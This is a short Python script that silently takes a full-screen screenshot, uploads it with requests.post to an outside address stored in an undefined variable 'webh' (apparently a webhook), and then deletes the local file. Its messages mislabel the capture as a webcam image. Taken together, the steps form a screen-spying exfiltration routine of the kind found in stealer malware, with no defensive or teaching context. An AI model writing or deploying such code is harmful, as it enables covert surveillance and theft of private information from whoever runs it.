import requests
import os
from PIL import ImageGrab

def screen(filename="screenshot_capture.png"):
    try:
        img = ImageGrab.grab()
        img.save(filename)
        return filename
    except Exception:
        return None

def web2(file_path):
    if not os.path.isfile(file_path):
        return False
    try:
        with open(file_path, 'rb') as f:
            r = requests.post(webh, files={'file': f})
        return r.status_code == 204 or r.status_code == 200
    except Exception:
        return False

def after():
    img_file = screen()
    if img_file is None:
        print("Failed to capture webcam image.")
        return

    if web2(img_file):
        print("Webcam image sent.")
        os.remove(img_file)
    else:
        print("Failed to send webcam image.")

after()
